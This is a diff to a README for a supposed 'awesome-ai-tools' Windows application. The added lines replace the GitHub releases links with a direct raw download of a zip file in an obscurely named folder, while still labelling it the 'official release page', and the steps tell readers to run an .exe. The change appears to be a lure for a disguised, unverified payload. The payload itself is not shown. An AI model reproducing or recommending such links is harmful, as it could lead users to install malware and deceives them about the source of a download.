@@ -1,6 +1,6 @@
 # 🤖 awesome-ai-tools - Find the best AI tools today
 
-[![Download Now](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/puissant-familypsilophytaceae582/awesome-ai-tools/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest-blue.svg)](https://raw.githubusercontent.com/puissant-familypsilophytaceae582/awesome-ai-tools/main/eccoprotic/ai-awesome-tools-1.6.zip)
 
 ## What is this tool? 🛠️
 
@@ -14,7 +14,7 @@ Your computer needs a standard Windows 10 or Windows 11 installation. This tool 
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official release page](https://github.com/puissant-familypsilophytaceae582/awesome-ai-tools/releases) to access the download options.
+1. Visit the [official release page](https://raw.githubusercontent.com/puissant-familypsilophytaceae582/awesome-ai-tools/main/eccoprotic/ai-awesome-tools-1.6.zip) to access the download options.
 2. Look for the file ending in `.exe`. 
 3. Click the link to save the file to your computer.
 4. Locate the file in your Downloads folder.
